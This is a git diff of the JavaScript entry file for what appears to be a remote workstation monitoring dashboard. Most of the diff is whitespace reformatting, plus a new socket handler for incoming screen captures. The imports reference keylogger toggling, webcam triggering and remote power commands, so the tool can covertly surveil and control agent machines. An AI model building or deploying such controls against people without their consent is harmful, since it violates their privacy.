@@ -3,22 +3,24 @@ import renderApp from './templates/renderer.js';
 import { initSocket, getSocket } from './lib/socket.js';
 import { switchPanel, getElementById } from './utils/dom.js';
 import { addAuditRow, logSystemEvent } from './utils/audit.js';
-import { 
-  onTargetMachineChange, 
+import {
+  onTargetMachineChange,
   updateMachineDropdown,
   addMachineOnline,
   removeMachineOffline,
   getTargetMachine
 } from './components/machine-selector.js';
-import { 
-  handleScreenTrigger, 
-  handleProcesses 
+
+import {
+  handleScreenTrigger,
+  handleProcesses,
+  handleScreenData
 } from './pages/monitor.js';
-import { 
-  handleWebcamTrigger, 
-  handlePowerCommand, 
-  toggleKeyloggerState, 
-  clearKeyloggerArea 
+import {
+  handleWebcamTrigger,
+  handlePowerCommand,
+  toggleKeyloggerState,
+  clearKeyloggerArea
 } from './pages/control.js';
 
 // Render app
@@ -36,14 +38,18 @@ socket.on('server_send_procs_to_web', (data) => {
   handleProcesses(data);
 });
 
+socket.on('server_send_screen_to_web', (data) => {
+  handleScreenData(data);
+});
+
 socket.on('server_send_audit_to_web', (data) => {
   console.log("Nhận log trạng thái máy trạm:", data);
-  
-  const isOnline = data.action === 'AGENT_ONLINE' ? true : 
-                   data.action === 'AGENT_OFFLINE' ? false : null;
-  
+
+  const isOnline = data.action === 'AGENT_ONLINE' ? true :
+    data.action === 'AGENT_OFFLINE' ? false : null;
+
   logSystemEvent(data.action, data.machine_name, data.status, isOnline);
-  
+
   if (isOnline === true) {
     addMachineOnline(data.machine_name);
   } else if (isOnline === false) {
